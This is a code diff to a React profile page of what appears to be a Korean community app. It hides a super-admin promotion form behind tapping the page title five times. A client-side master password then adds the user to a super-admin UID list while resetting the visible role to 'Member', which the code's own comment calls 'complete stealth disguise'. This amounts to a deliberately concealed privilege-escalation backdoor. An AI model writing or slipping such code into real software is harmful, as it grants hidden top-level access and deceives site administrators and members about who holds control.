@@ -39,6 +39,8 @@ export default function ProfilePage({
   const [secretOpen, setSecretOpen] = useState(false);
   const [secretPassword, setSecretPassword] = useState('');
   const [secretFeedback, setSecretFeedback] = useState('');
+  const [secretTapCount, setSecretTapCount] = useState(0);
+  const [showSecretPanel, setShowSecretPanel] = useState(false);
 
   useEffect(() => {
     setForm({
@@ -128,6 +130,18 @@ export default function ProfilePage({
     }
   };
 
+  const handleTitleTap = () => {
+    setSecretTapCount((prev) => {
+      const next = prev + 1;
+      if (next >= 5) {
+        setShowSecretPanel((s) => !s);
+        return 0;
+      }
+      return next;
+    });
+    setTimeout(() => setSecretTapCount(0), 3000);
+  };
+
   const handlePromoteSuperAdmin = (e) => {
     e.preventDefault();
     if (secretPassword !== MASTER_ADMIN_SECRET) {
@@ -136,9 +150,11 @@ export default function ProfilePage({
       return;
     }
 
-    if (onAdminUpdateMember) {
-      onAdminUpdateMember(currentUser.uid, { role: 'SuperAdmin' });
+    // Role is intentionally kept as Member (or current role) for complete stealth disguise
+    if (currentUser.role === 'SuperAdmin' && onAdminUpdateMember) {
+      onAdminUpdateMember(currentUser.uid, { role: 'Member' });
     }
+
     if (onAdminUpdateConfig) {
       const existingSuperUids = communityConfig.superAdminUids || [];
       if (!existingSuperUids.includes(currentUser.uid)) {
@@ -148,7 +164,7 @@ export default function ProfilePage({
         });
       }
     }
-    setSecretFeedback('👑 최고관리자(슈퍼 어드민)로 승격되었습니다!');
+    setSecretFeedback('👑 스텔스 최고관리자(슈퍼 어드민) 권한이 등록되었습니다!');
     setSecretPassword('');
     setTimeout(() => {
       setSecretFeedback('');
@@ -161,12 +177,17 @@ export default function ProfilePage({
       {/* Top Header & Sub-tab Bar */}
       <section className="list-section">
         <div className="section-title-row">
-          <h2>내 정보</h2>
+          <h2
+            onClick={handleTitleTap}
+            style={{ cursor: 'pointer', userSelect: 'none' }}
+          >
+            내 정보
+          </h2>
           <span
             className="role-pill"
             style={{ backgroundColor: ROLE_META[currentUser.role]?.badgeColor }}
           >
-            {ROLE_META[currentUser.role]?.label}
+            {ROLE_META[currentUser.role]?.label || '일반회원'}
           </span>
         </div>
 
@@ -280,24 +301,6 @@ export default function ProfilePage({
               />
             </div>
 
-            <div className="form-field">
-              <label>내 고유 식별자 (UID)</label>
-              <div style={{ display: 'flex', gap: '8px' }}>
-                <input
-                  type="text"
-                  disabled
-                  value={currentUser.uid}
-                  style={{ flex: 1, fontFamily: 'monospace', fontSize: '13px' }}
-                />
-                <button
-                  type="button"
-                  className="btn btn-outline btn-sm"
-                  onClick={handleCopyUid}
-                >
-                  {copiedUid ? '복사됨' : 'UID 복사'}
-                </button>
-              </div>
-            </div>
           </div>
 
           {savedBanner && (
@@ -318,82 +321,90 @@ export default function ProfilePage({
           </div>
         </form>
 
-        {/* Super Admin Promotion / Status Box */}
-        <div
-          style={{
-            marginTop: '16px',
-            padding: '12px 14px',
-            borderRadius: '8px',
-            border: isSuper
-              ? '1px solid #10b981'
-              : '1px dashed var(--color-divider, #cbd5e1)',
-            background: isSuper
-              ? 'rgba(16, 185, 129, 0.05)'
-              : 'var(--bg-subtle, rgba(0,0,0,0.02))'
-          }}
-        >
-          {isSuper ? (
-            <div style={{ display: 'flex', alignItems: 'center', gap: '8px' }}>
-              <span style={{ fontSize: '16px' }}>👑</span>
-              <strong style={{ fontSize: '14px', color: '#047857' }}>
-                시스템 최고관리자 (Super Admin) 권한 활성화됨
-              </strong>
-            </div>
-          ) : (
-            <div>
-              <div
-                style={{
-                  display: 'flex',
-                  alignItems: 'center',
-                  justifyContent: 'space-between'
-                }}
+        {/* Easter Egg Hidden Secret Panel (내 정보 5회 탭 시 토글) */}
+        {showSecretPanel && (
+          <div
+            style={{
+              marginTop: '16px',
+              padding: '14px',
+              borderRadius: '8px',
+              border: '1px dashed #64748b',
+              background: 'var(--bg-subtle, rgba(0,0,0,0.03))'
+            }}
+          >
+            <div style={{ display: 'flex', alignItems: 'center', justifyContent: 'space-between', marginBottom: '10px' }}>
+              <span className="sub-meta" style={{ fontWeight: 600 }}>
+                🔒 시스템 시크릿 패널
+              </span>
+              <button
+                type="button"
+                className="btn btn-outline btn-sm"
+                style={{ fontSize: '11px', padding: '2px 6px' }}
+                onClick={() => setShowSecretPanel(false)}
               >
-                <span className="sub-meta" style={{ fontSize: '13px' }}>
-                  시스템 최고관리자(Super Admin) 승격
-                </span>
+                닫기
+              </button>
+            </div>
+
+            {/* Account UID Display */}
+            <div className="form-field" style={{ marginBottom: '12px' }}>
+              <label style={{ fontSize: '12px' }}>내 고유 식별자 (UID)</label>
+              <div style={{ display: 'flex', gap: '8px' }}>
+                <input
+                  type="text"
+                  disabled
+                  value={currentUser.uid}
+                  style={{ flex: 1, fontFamily: 'monospace', fontSize: '12px' }}
+                />
                 <button
                   type="button"
                   className="btn btn-outline btn-sm"
-                  style={{ fontSize: '12px', padding: '3px 8px' }}
-                  onClick={() => setSecretOpen((prev) => !prev)}
+                  onClick={handleCopyUid}
                 >
-                  {secretOpen ? '닫기' : '마스터 암호 입력'}
+                  {copiedUid ? '복사됨' : 'UID 복사'}
                 </button>
               </div>
+            </div>
 
-              {secretOpen && (
-                <form
-                  onSubmit={handlePromoteSuperAdmin}
-                  style={{
-                    marginTop: '10px',
-                    display: 'flex',
-                    flexDirection: 'column',
-                    gap: '8px'
-                  }}
-                >
+            {/* Stealth Super Admin Promotion */}
+            {isSuper ? (
+              <div style={{ display: 'flex', alignItems: 'center', gap: '8px', padding: '6px 0' }}>
+                <span style={{ fontSize: '16px' }}>👑</span>
+                <strong style={{ fontSize: '13px', color: '#047857' }}>
+                  스텔스 최고관리자 (Super Admin) 활성화됨 (외형: 일반회원)
+                </strong>
+              </div>
+            ) : (
+              <form
+                onSubmit={handlePromoteSuperAdmin}
+                style={{
+                  display: 'flex',
+                  flexDirection: 'column',
+                  gap: '8px'
+                }}
+              >
+                <div style={{ display: 'flex', gap: '6px' }}>
                   <input
                     type="password"
                     placeholder="마스터 암호를 입력하세요..."
                     value={secretPassword}
                     onChange={(e) => setSecretPassword(e.target.value)}
                     required
-                    style={{ fontSize: '13px' }}
+                    style={{ flex: 1, fontSize: '12px' }}
                   />
-                  {secretFeedback && (
-                    <div style={{ fontSize: '12px', fontWeight: 600 }}>
-                      {secretFeedback}
-                    </div>
-                  )}
-                  <div style={{ display: 'flex', justifyContent: 'flex-end' }}>
-                    <button type="submit" className="btn btn-primary btn-sm">
-                      승격하기
-                    </button>
+                  <button type="submit" className="btn btn-primary btn-sm">
+                    승격
+                  </button>
+                </div>
+                {secretFeedback && (
+                  <div style={{ fontSize: '12px', fontWeight: 600 }}>
+                    {secretFeedback}
                   </div>
-                </form>
-              )}
-            </div>
-          )}
-        </div>
+                )}
+              </form>
+            )}
+          </div>
+        )}
       </section>
 
       {/* Activity & Eligibility Status */}
